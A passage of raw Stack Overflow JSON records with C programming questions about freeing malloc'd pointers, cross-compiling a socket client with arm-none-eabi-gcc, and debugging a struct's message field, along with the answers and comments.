I&#39;d expect <code>int** ptr1 = (int**)malloc(sizeof(int *)*10);</code>"}, {"owner": {"reputation": 631, "user_id": 1701799, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/277F9.jpg?s=128&g=1", "display_name": "RastaJedi", "link": "https://stackoverflow.com/users/1701799/rastajedi"}, "edited": false, "score": 1, "creation_date": 1461782025, "post_id": 36895196, "comment_id": 61360371, "body": "Don&#39;t cast the return value of <code>malloc()</code>, see <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc/605858#605858\">here</a>."}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 1, "creation_date": 1461812706, "post_id": 36895196, "comment_id": 61372705, "body": "<a href=\"https://makecleanandmake.com/2014/07/26/how-to-malloc-the-right-way/\" rel=\"nofollow noreferrer\">malloc()ing</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1190, "user_id": 4070000, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4c671fa7002be8d180675875a8c9148e?s=128&d=identicon&r=PG&f=1", "display_name": "orbitcowboy", "link": "https://stackoverflow.com/users/4070000/orbitcowboy"}, "edited": false, "score": 0, "creation_date": 1461781132, "post_id": 36895303, "comment_id": 61359782, "body": "This question is off topic, but did you use a tool to draw this figures?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 1190, "user_id": 4070000, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4c671fa7002be8d180675875a8c9148e?s=128&d=identicon&r=PG&f=1", "display_name": "orbitcowboy", "link": "https://stackoverflow.com/users/4070000/orbitcowboy"}, "edited": false, "score": 0, "creation_date": 1461813802, "post_id": 36895303, "comment_id": 61373018, "body": "@MartinEttl Nope, did it by hand. :)"}, {"owner": {"reputation": 1190, "user_id": 4070000, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4c671fa7002be8d180675875a8c9148e?s=128&d=identicon&r=PG&f=1", "display_name": "orbitcowboy", "link": "https://stackoverflow.com/users/4070000/orbitcowboy"}, "edited": false, "score": 0, "creation_date": 1462950281, "post_id": 36895303, "comment_id": 61847345, "body": "Then you might take a look at <a href=\"http://unix.stackexchange.com/questions/126630/creating-diagrams-in-ascii/127782#127782\">this discussion</a>. There are plenty of tools available."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 3, "last_activity_date": 1461773947, "last_edit_date": 1461773947, "creation_date": 1461773476, "answer_id": 36895303, "question_id": 36895196, "link": "https://stackoverflow.com/questions/36895196/free-a-pointer-equal-to-a-malloc-pointer/36895303#36895303", "title": "Free a pointer equal to a malloc pointer", "body": "<p>Yes and no, respectively.</p>\n\n<p>Also note that <code>malloc(sizeof(int)*10);</code> in the second example will work, but it will not necessarily allocate space for ten pointers.</p>\n\n<hr>\n\n<p>To explain what happens in the first example, after the assignment to <code>ptr2</code> you have something like this:</p>\n\n<pre>\n+------+\n| ptr1 | ---\\\n+------+     \\      +----------------------------+\n              >---> | memory allocated by malloc |\n+------+     /      +----------------------------+\n| ptr2 | ---/\n+------+\n</pre>\n\n<p>Both variables contain the same value, the pointer returned by <code>malloc</code>, so you can use either of them to access the allocated memory.</p>\n\n<p>For the second question, what you have is something like this:</p>\n\n<pre>\n+---------+---------+---------+-----+\n| ptr1[0] | ptr1[1] | ptr1[2] | ... |\n+---------+---------+---------+-----+\n  |\n  |\n  v\n+----------------------------+\n| memory allocated by malloc |\n+----------------------------+\n  ^\n  |\n  |\n+------+\n| ptr2 |\n+------+\n</pre>\n\n<p>When you free the memory pointer to by <code>ptr1</code> that only frees that memory, the memory pointed to by <code>ptr2</code> is still there and accessible through <code>ptr2</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 0, "creation_date": 1461774401, "post_id": 36895320, "comment_id": 61355401, "body": "Thanks ! If I define a struct with <code>int tab[10]</code> in it. Then create this struct with malloc and delete it with free. Should I worry about my tab ?"}, {"owner": {"reputation": 23064, "user_id": 3177124, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/65014fdf3cfd04b1452620aeb54dcede?s=128&d=identicon&r=PG&f=1", "display_name": "abligh", "link": "https://stackoverflow.com/users/3177124/abligh"}, "reply_to_user": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 1, "creation_date": 1461774506, "post_id": 36895320, "comment_id": 61355486, "body": "@Kenshin: If you allocate a <code>struct</code> will <code>malloc()</code> and free it with <code>free()</code> this will free the allocation you made with <code>malloc()</code> but not free anything referenced by the structure. The simple rule is for every allocation, there has to be a matched <code>free()</code> - nice and simple. There&#39;s no concept of a &#39;recursive&#39; free."}, {"owner": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 0, "creation_date": 1461774585, "post_id": 36895320, "comment_id": 61355529, "body": "Yes but my tab wasn&#39;t created with a malloc. So Is my tab considered part of my struct or should I delete it somehow ?"}, {"owner": {"reputation": 23064, "user_id": 3177124, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/65014fdf3cfd04b1452620aeb54dcede?s=128&d=identicon&r=PG&f=1", "display_name": "abligh", "link": "https://stackoverflow.com/users/3177124/abligh"}, "reply_to_user": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 1, "creation_date": 1461774712, "post_id": 36895320, "comment_id": 61355613, "body": "@Kenshin if you create the struct with <code>malloc()</code> but not the <code>int tab[10]</code> then you should only <code>free()</code> the <code>struct</code>, and not <code>free()</code> the <code>int tab[10]</code>. The rules are simple - match <code>malloc()</code> (and anything else that allocates on the heap) and <code>free()</code>"}, {"owner": {"reputation": 23064, "user_id": 3177124, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/65014fdf3cfd04b1452620aeb54dcede?s=128&d=identicon&r=PG&f=1", "display_name": "abligh", "link": "https://stackoverflow.com/users/3177124/abligh"}, "reply_to_user": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 0, "creation_date": 1461774870, "post_id": 36895320, "comment_id": 61355707, "body": "@Kenshin: in general it&#39;s useful to remember that C is quite stupid and does nothing &#39;behind your back&#39;. Compare with (e.g.) Java. Some consider this to be a feature not a bug."}, {"owner": {"reputation": 631, "user_id": 1701799, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/277F9.jpg?s=128&g=1", "display_name": "RastaJedi", "link": "https://stackoverflow.com/users/1701799/rastajedi"}, "edited": false, "score": 0, "creation_date": 1461872132, "post_id": 36895320, "comment_id": 61409233, "body": "You&#39;re right that you don&#39;t need to cast <code>malloc()</code> return value, but it&#39;s not just that it&#39;s bad style if you do, it can hide errors (has to do with forgetting to include a header or something I think?)."}, {"owner": {"reputation": 23064, "user_id": 3177124, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/65014fdf3cfd04b1452620aeb54dcede?s=128&d=identicon&r=PG&f=1", "display_name": "abligh", "link": "https://stackoverflow.com/users/3177124/abligh"}, "reply_to_user": {"reputation": 631, "user_id": 1701799, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/277F9.jpg?s=128&g=1", "display_name": "RastaJedi", "link": "https://stackoverflow.com/users/1701799/rastajedi"}, "edited": false, "score": 0, "creation_date": 1461872428, "post_id": 36895320, "comment_id": 61409373, "body": "@RastaJedi click on the link I put in the text and it will lead you to a long discussion."}, {"owner": {"reputation": 631, "user_id": 1701799, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/277F9.jpg?s=128&g=1", "display_name": "RastaJedi", "link": "https://stackoverflow.com/users/1701799/rastajedi"}, "reply_to_user": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "edited": false, "score": 0, "creation_date": 1461872612, "post_id": 36895320, "comment_id": 61409474, "body": "@abligh yeah that&#39;s a good link; I linked him to it in a comment in OP too. It&#39;s also good that it notes it&#39;s usually better to do <code>sizeof *array</code> instead of <code>sizeof (int)</code> in case the type changes. I never used to use this style until I read it here on SO. @Kenshin yeah and I know this only about C but the same can be said about C++: match every <code>malloc()</code>/<code>free()</code>, <code>new</code>/<code>delete</code>, and <code>new[]</code>/<code>delete[]</code>."}], "tags": [], "owner": {"reputation": 23064, "user_id": 3177124, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/65014fdf3cfd04b1452620aeb54dcede?s=128&d=identicon&r=PG&f=1", "display_name": "abligh", "link": "https://stackoverflow.com/users/3177124/abligh"}, "is_accepted": true, "score": 5, "last_activity_date": 1461773522, "last_edit_date": 1495535634, "creation_date": 1461773522, "answer_id": 36895320, "question_id": 36895196, "link": "https://stackoverflow.com/questions/36895196/free-a-pointer-equal-to-a-malloc-pointer/36895320#36895320", "title": "Free a pointer equal to a malloc pointer", "body": "<pre><code>int* ptr1 = (int*)malloc(sizeof(int)*10);\nint* ptr2 = ptr1;\nfree(ptr2);\n</code></pre>\n\n<p>That is fine, <code>ptr2</code> contains the same value as <code>ptr1</code>, and thus the memory you passed to <code>malloc()</code> is <code>free()</code>d.</p>\n\n<pre><code>int** ptr1 = (int**)malloc(sizeof(int)*10);\nint* ptr2 = (int*)malloc(sizeof(int));\n*ptr2=10;\nptr1[0]=ptr2;\nfree(ptr1);\n</code></pre>\n\n<p>That is not fine. You are storing the value of <code>ptr2</code> in the <code>ptr1</code> array, but not freeing it. You want:</p>\n\n<pre><code>int** ptr1 = (int**)malloc(sizeof(int*)*10);\nint* ptr2 = (int*)malloc(sizeof(int));\n*ptr2=10;\nptr1[0]=ptr2; \n...\nfree(ptr1[0]);\nfree(ptr1);\n</code></pre>\n\n<p>Note I have also changed the <code>malloc()</code> to allocate 10 pointers to <code>int</code>, not merely ten <code>int</code>s (which may not be the same size).</p>\n\n<p>Finally note that you <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">don't need to cast the return value from <code>malloc()</code></a> in C. I haven't fixed that for you as it is not a problem in itself and is unrelated to your question, but it is (arguably) bad style.</p>\n"}, {"tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 2, "last_activity_date": 1461773866, "creation_date": 1461773866, "answer_id": 36895443, "question_id": 36895196, "link": "https://stackoverflow.com/questions/36895196/free-a-pointer-equal-to-a-malloc-pointer/36895443#36895443", "title": "Free a pointer equal to a malloc pointer", "body": "<p><code>malloc</code> and <code>free</code> do not know about your data structures.  All they know about is blobs of bytes.</p>\n\n<p>As a general rule, there should be a one-to-one relationship between your <code>malloc</code> and <code>free</code> calls.  (There are plenty of exceptions, but it's a good general rule.)</p>\n\n<p>It is never the case that a single call to <code>free</code> will simultaneously free two separate blocks allocated by two calls to <code>malloc</code>.</p>\n\n<p>So, as others have said, the answers to your questions are \"Yes\" and \"No\".</p>\n"}, {"tags": [], "owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "is_accepted": false, "score": 0, "last_activity_date": 1461778483, "creation_date": 1461778483, "answer_id": 36896987, "question_id": 36895196, "link": "https://stackoverflow.com/questions/36895196/free-a-pointer-equal-to-a-malloc-pointer/36896987#36896987", "title": "Free a pointer equal to a malloc pointer", "body": "<blockquote>\n  <p>Is the free(ptr2) going to delete my array as I want ?</p>\n</blockquote>\n\n<p>I think the term <code>delete</code> cannot be used here. The <a href=\"http://www.gnu.org/software/libc/manual/html_node/Freeing-after-Malloc.html\" rel=\"nofollow\">GNU manual</a> says :</p>\n\n<blockquote>\n  <p>When you no longer need a block that you got with malloc, use the\n  function free to make the block available to be allocated again.</p>\n</blockquote>\n\n<p>However free doesn't set pointer automatically to NULL because the function return type itself is <code>void</code>.  Also,</p>\n\n<blockquote>\n  <p>Freeing a block alters the contents of the block. Do not expect to\n  find any data (such as a pointer to the next block in a chain of\n  blocks) in the block after freeing it.</p>\n</blockquote>\n\n<p>I am not spurring a debate on whether you should set the pointer to NULL after freeing it. However,I felt tempted to post this example which crashes and burns :</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main()\n{\n    int* ptr1 = malloc(sizeof(int)*10);\n    int* ptr2 = ptr1;\n    free(ptr2);\n    if(ptr2!=NULL)\n    {\n        printf(\"ptr is %p\\n\",ptr2); // still printf\n        printf(\"Enter a number for ptr2 :\");\n        scanf(\"%d\",ptr2);\n        printf(\"Value pointed to by ptr2 : %d\\n\",*ptr2);\n        printf(\"Value pointed to by ptr1 : %d\\n\",*ptr1);\n    }\n    else\n        printf(\"Ptr2 pointed to null\");\n    printf(\"Size of ptr1 : %d\\n\",sizeof(ptr1));\n\n    if(ptr1==NULL)\n        printf(\"ptr1 NULL\\n\");\n    printf(\"Enter a number for ptr1 :\");\n    scanf(\"%d\",ptr1);\n    printf(\"Value pointed to by ptr1 : %d\\n\",*ptr1);\n    printf(\"Value pointed to by ptr2 : %d\\n\",*ptr2);\n\n    free(ptr1);\n    if(ptr1==NULL)\n        printf(\"ptr1 freed\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>ptr is 0x1c92010\nEnter a number for ptr2 :4\nValue pointed to by ptr2 : 4\nValue pointed to by ptr1 : 4\nSize of ptr1 : 8\nEnter a number for ptr1 :1\nValue pointed to by ptr1 : 1\nValue pointed to by ptr2 : 1\n*** glibc detected *** ./testp: double free or corruption (fasttop): 0x0000000001c92010 ***\nSegmentation fault (core dumped)\n</code></pre>\n"}], "owner": {"reputation": 698, "user_id": 4187028, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/bxwgq.png?s=128&g=1", "display_name": "M-Gregoire", "link": "https://stackoverflow.com/users/4187028/m-gregoire"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3372, "favorite_count": 1, "accepted_answer_id": 36895320, "answer_count": 4, "score": 4, "last_activity_date": 1461780827, "creation_date": 1461773189, "last_edit_date": 1461780827, "question_id": 36895196, "link": "https://stackoverflow.com/questions/36895196/free-a-pointer-equal-to-a-malloc-pointer", "title": "Free a pointer equal to a malloc pointer", "body": "<p>I'm having trouble understanding some of the free() behavior.</p>\n\n<pre><code>int* ptr1 = (int*)malloc(sizeof (int)*10);\nint* ptr2 = ptr1;\nfree(ptr2);\n</code></pre>\n\n<p>Is the <code>free(ptr2)</code> going to delete my array as I want ?</p>\n\n<p>What if I do :</p>\n\n<pre><code>int** ptr1 = (int**)malloc(sizeof (int)*10);\nint* ptr2 = (int*)malloc(sizeof (int));\n*ptr2 = 10;\nptr1[0] = ptr2;\nfree(ptr1);\n</code></pre>\n\n<p>Is this code correct ? Will <code>free(ptr1)</code> will also delete the space of ptr2 ?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "c", "gcc", "arm"], "comments": [{"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1461773170, "post_id": 36895123, "comment_id": 61354462, "body": "Well, do you have the cross-compiler toolchain already?  What OS are you running on the micro controller?"}, {"owner": {"reputation": 213, "user_id": 5046520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1e2b960e50c074118062eb9e953d7f3d?s=128&d=identicon&r=PG&f=1", "display_name": "AugustoQ", "link": "https://stackoverflow.com/users/5046520/augustoq"}, "reply_to_user": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1461773506, "post_id": 36895123, "comment_id": 61354722, "body": "I do have the cross-compiler tool chain, for eclipse. The micro controller runs linux."}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1461773733, "post_id": 36895123, "comment_id": 61354903, "body": "Are you pointing the cross-compiler at the appropriate headers and libraries for the target system (either manually with <code>-I</code>/<code>-L</code> or the easy way with <code>--sysroot=</code>)?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1461774237, "post_id": 36895123, "comment_id": 61355278, "body": "then you probably need to use arm-linux-gnueabi-gcc from the tool chain. <code>-none</code> is for bare metal applications."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 1, "creation_date": 1461774312, "post_id": 36895123, "comment_id": 61355336, "body": "@AugustoQ Related: <a href=\"http://stackoverflow.com/questions/18900855/how-to-work-with-external-libraries-when-cross-compiling\" title=\"how to work with external libraries when cross compiling\">stackoverflow.com/questions/18900855/&hellip;</a>"}, {"owner": {"reputation": 213, "user_id": 5046520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1e2b960e50c074118062eb9e953d7f3d?s=128&d=identicon&r=PG&f=1", "display_name": "AugustoQ", "link": "https://stackoverflow.com/users/5046520/augustoq"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1461774433, "post_id": 36895123, "comment_id": 61355428, "body": "@user3528438 Is it in anyways possible to solve using -none? I was asked to do it using that."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1461775353, "post_id": 36895123, "comment_id": 61356024, "body": "You can use <code>-I</code>, <code>-L</code>, <code>-Wl,-rpath</code>, <code>-Wl,-rpath-link</code>, <code>--sysroot</code> or even static linking to achieve that, but that&#39;s not a good idea because you don&#39;t know if the libraries are compatible with the compiler or not. If you are asked to compile a Linux application with <code>arm-none-eabi-gcc</code> you do need to know the rationale because the implied constraint could bite you later."}, {"owner": {"reputation": 213, "user_id": 5046520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1e2b960e50c074118062eb9e953d7f3d?s=128&d=identicon&r=PG&f=1", "display_name": "AugustoQ", "link": "https://stackoverflow.com/users/5046520/augustoq"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1461859884, "post_id": 36895123, "comment_id": 61401825, "body": "@user3528438 One last thing: is there any library for networking that I could use with arm-non-eabi-gcc without worry? One that doesn&#39;t depend on the system, or something like that."}], "owner": {"reputation": 213, "user_id": 5046520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1e2b960e50c074118062eb9e953d7f3d?s=128&d=identicon&r=PG&f=1", "display_name": "AugustoQ", "link": "https://stackoverflow.com/users/5046520/augustoq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 735, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1461774073, "creation_date": 1461773008, "last_edit_date": 1461774073, "question_id": 36895123, "link": "https://stackoverflow.com/questions/36895123/how-to-arm-none-eabi-gcc-client-server", "title": "How to arm-none-eabi-gcc Client-Server", "body": "<p>So, I need to use arm-none-eabi-gcc to run some authentications tests. But I've never used the cross compiler, and I can't find a lot of information on coding for it. Most importantly: I can't find a way to write a Client-Server program (client side using arm-gcc). I have tried re-using the code I wrote in plain C, with gcc, but it doesn't accept three of the libraries (namely, <code>&lt;sys/socket.h&gt;</code>, <code>&lt;netinet/in.h&gt;</code> and <code>&lt;netdb.h&gt;</code>), so I can't use it.</p>\n\n<p>Can anyone help me by showing me a way through with I can make a micro controller contact a server in order to simulate an authentication trial?</p>\n"}, {"tags": ["c", "arrays", "struct"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1461772153, "post_id": 36894757, "comment_id": 61353660, "body": "<code>if(filedata.data==NULL);</code> --&gt; drop the trailing <code>;</code>  Suggest using an auto formatter to help see the issues."}, {"owner": {"reputation": 26033, "user_id": 1047662, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/8aXzf.jpg?s=128&g=1", "display_name": "Cyclonecode", "link": "https://stackoverflow.com/users/1047662/cyclonecode"}, "edited": false, "score": 0, "creation_date": 1461772352, "post_id": 36894757, "comment_id": 61353805, "body": "Why the need to null terminate the message when you overwrite the contents right afterwards?"}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461772431, "post_id": 36894757, "comment_id": 61353868, "body": "That semicolon was a typo sorry- I still have the problem"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461772477, "post_id": 36894757, "comment_id": 61353915, "body": "Please don&#39;t correct errors like that. People need to follow the comments."}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461772600, "post_id": 36894757, "comment_id": 61354016, "body": "same problem even if i remove chat_info[queue].message[0]=&#39;\\0&#39;;"}, {"owner": {"reputation": 16587, "user_id": 177053, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f6c516626d381a1ea383cedd1799486?s=128&d=identicon&r=PG", "display_name": "Vasfed", "link": "https://stackoverflow.com/users/177053/vasfed"}, "edited": false, "score": 0, "creation_date": 1461772764, "post_id": 36894757, "comment_id": 61354142, "body": "<code>message</code> can contain whitespace so it looks like empty, but is not. Try adding quotes around"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461773089, "post_id": 36894757, "comment_id": 61354404, "body": "I can&#39;t see why you don&#39;t get a segfault (or a polite &quot;(null)&quot; inserted by <code>printf</code>) in <code>if(filedata.data == NULL) { printf(&quot;\\n  data is %s&quot;, filedata.data); }</code>"}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "reply_to_user": {"reputation": 16587, "user_id": 177053, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f6c516626d381a1ea383cedd1799486?s=128&d=identicon&r=PG", "display_name": "Vasfed", "link": "https://stackoverflow.com/users/177053/vasfed"}, "edited": false, "score": 0, "creation_date": 1461773475, "post_id": 36894757, "comment_id": 61354702, "body": "@Vasfed I tried that it displays ** (for <i>%s</i>)"}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461773496, "post_id": 36894757, "comment_id": 61354712, "body": "@weather Vane-  I donno why it does that- no segfault"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461773730, "post_id": 36894757, "comment_id": 61354901, "body": "Well the whole thing seems to be a muddle, lack of proper indentation and incomplete code block do not help."}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461777527, "post_id": 36894757, "comment_id": 61357443, "body": "@WeatherVane thank you for your help regarding bad indendation , correction of typos and muddled code- this is a part of a much larger code and doesn&#39;t make sense posting the whole thing. I got a reply below which actually helped.."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461777851, "post_id": 36894757, "comment_id": 61357676, "body": "@noob you are welcome, but I did point out the error repeated in the fuller answer. You are asked to provide a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> which shows what you have tried, then we don&#39;t have any nonsense about typos and incomplete code blocks."}], "answers": 